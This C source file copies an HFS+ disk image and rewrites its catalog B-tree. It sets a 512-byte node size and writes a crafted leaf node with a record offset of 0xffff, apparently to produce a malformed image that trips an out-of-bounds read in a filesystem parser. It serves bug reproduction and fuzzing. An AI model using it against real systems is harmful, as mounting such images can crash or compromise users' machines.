#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static uint16_t be16(const uint8_t *p) {
    return (uint16_t)((uint16_t)p[0] << 8 | p[1]);
}

static uint32_t be32(const uint8_t *p) {
    return (uint32_t)p[0] << 24 | (uint32_t)p[1] << 16 |
           (uint32_t)p[2] << 8 | p[3];
}

static void put_be16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v >> 8);
    p[1] = (uint8_t)v;
}

static void put_be32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)v;
}

static void die(const char *what) {
    fprintf(stderr, "%s: %s\n", what, strerror(errno));
    exit(1);
}

static void copy_image(int in_fd, int out_fd) {
    uint8_t buf[65536];
    ssize_t n;

    while ((n = read(in_fd, buf, sizeof(buf))) > 0) {
        ssize_t done = 0;
        while (done < n) {
            ssize_t w = write(out_fd, buf + done, (size_t)(n - done));
            if (w < 0)
                die("write output");
            done += w;
        }
    }
    if (n < 0)
        die("read input");
}

static void write_exact(int fd, const void *buf, size_t len, off_t off) {
    const uint8_t *p = buf;
    size_t done = 0;

    while (done < len) {
        ssize_t n = pwrite(fd, p + done, len - done, off + (off_t)done);
        if (n <= 0)
            die("pwrite");
        done += (size_t)n;
    }
}

int main(int argc, char **argv) {
    uint8_t vh[512];
    uint8_t header_patch[14];
    uint8_t leaf[512];
    uint32_t block_size;
    uint32_t catalog_start;
    off_t catalog_base;
    int in_fd;
    int out_fd;

    if (argc != 3) {
        fprintf(stderr, "usage: %s input.raw output.raw\n", argv[0]);
        return 2;
    }

    in_fd = open(argv[1], O_RDONLY);
    if (in_fd < 0)
        die("open input");
    out_fd = open(argv[2], O_CREAT | O_TRUNC | O_RDWR, 0600);
    if (out_fd < 0)
        die("open output");
    copy_image(in_fd, out_fd);
    close(in_fd);

    if (pread(out_fd, vh, sizeof(vh), 1024) != (ssize_t)sizeof(vh))
        die("read volume header");
    if (be16(vh) != 0x482b && be16(vh) != 0x4858) {
        fprintf(stderr, "unexpected HFS+ signature: 0x%04x\n", be16(vh));
        return 1;
    }

    block_size = be32(vh + 0x28);
    catalog_start = be32(vh + 0x120);
    if (block_size < 512 || catalog_start == 0) {
        fprintf(stderr, "unexpected geometry: block=%u catalogStart=%u\n",
                block_size, catalog_start);
        return 1;
    }
    catalog_base = (off_t)catalog_start * block_size;

    /* BTHeaderRec fields at node offset 14: leafRecords, firstLeaf, nodeSize. */
    if (pread(out_fd, header_patch, sizeof(header_patch), catalog_base + 20) !=
        (ssize_t)sizeof(header_patch))
        die("read catalog header fields");
    put_be32(header_patch + 0, 1);
    put_be32(header_patch + 4, 1);
    put_be16(header_patch + 12, 512);
    write_exact(out_fd, header_patch, sizeof(header_patch), catalog_base + 20);

    memset(leaf, 0, sizeof(leaf));
    leaf[8] = 0xff;
    leaf[9] = 1;
    put_be16(leaf + 10, 1);
    put_be16(leaf + sizeof(leaf) - 2, 0xffff);
    write_exact(out_fd, leaf, sizeof(leaf), catalog_base + 512);

    if (fsync(out_fd) != 0)
        die("fsync");
    close(out_fd);

    printf("blockSize=%u catalogStart=%u catalogBase=%lld nodeSize=512 recordOffset=65535\n",
           block_size, catalog_start, (long long)catalog_base);
    return 0;
}
